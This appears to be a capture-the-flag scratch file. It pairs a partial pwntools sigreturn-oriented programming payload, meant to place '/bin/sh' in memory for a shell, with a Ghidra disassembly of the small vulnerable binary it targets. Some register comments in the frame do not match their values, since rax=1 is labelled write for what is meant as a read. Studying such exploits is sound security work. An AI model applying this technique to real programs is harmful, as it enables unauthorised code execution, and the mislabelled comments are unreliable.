'''
# call sigreturn
nextPayload = b""
nextPayload += p64(0x0)
nextPayload += p64(0x0)
nextPayload += p64(0x0)
nextPayload += p64(0xf) # rax
nextPayload += p64(0x0)
nextPayload += p64(0x0)
nextPayload += p64(0x0)
nextPayload += p64(0x0)

# write /bin/sh to 0x400590
frame = SigreturnFrame()
frame.rip = 0x00400118
frame.rax = 0x1 # syscall write
frame.rdi = 0x0 # stdin
frame.rsi = 0x400590 # buffer addr
frame.rdx = 0x8 # size
nextPayload += bytes(frame)
'''
                             //
                             // .text 
                             // SHT_PROGBITS  [0x4000e0 - 0x40016d]
                             // ram:004000e0-ram:0040016d
                             //
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined processEntry entry()
             undefined         AL:1           <RETURN>
                             _start                                          XREF[3]:     Entry Point(*), 00400018(*), 
                             entry                                                        _elfSectionHeaders::00000090(*)  
        004000e0 55              PUSH       RBP
        004000e1 48 89 e5        MOV        RBP,RSP
        004000e4 48 81 ec        SUB        RSP,0x200
                 00 02 00 00
        004000eb bf 01 00        MOV        EDI,0x1
                 00 00
        004000f0 48 be 30        MOV        RSI,msg1                                         = 48h    H
                 01 40 00 
                 00 00 00 00
        004000fa ba 3e 00        MOV        EDX,0x3e
                 00 00
        004000ff b8 01 00        MOV        EAX,0x1
                 00 00
        00400104 0f 05           SYSCALL
        00400106 b8 00 00        MOV        EAX,0x0
                 00 00
        0040010b 48 89 e6        MOV        RSI,RSP
        0040010e bf 00 00        MOV        EDI,0x0
                 00 00
        00400113 ba 00 02        MOV        EDX,0x200
                 00 00
        00400118 0f 05           SYSCALL
        0040011a 41 5c           POP        R12
        0040011c 41 5b           POP        R11
        0040011e 5f              POP        RDI
        0040011f 58              POP        RAX
        00400120 5b              POP        RBX
        00400121 5a              POP        RDX
        00400122 5e              POP        RSI
        00400123 5f              POP        RDI
        00400124 0f 05           SYSCALL
        00400126 b8 3c 00        MOV        EAX,0x3c
                 00 00
        0040012b 48 31 ff        XOR        RDI,RDI
        0040012e 0f 05           SYSCALL
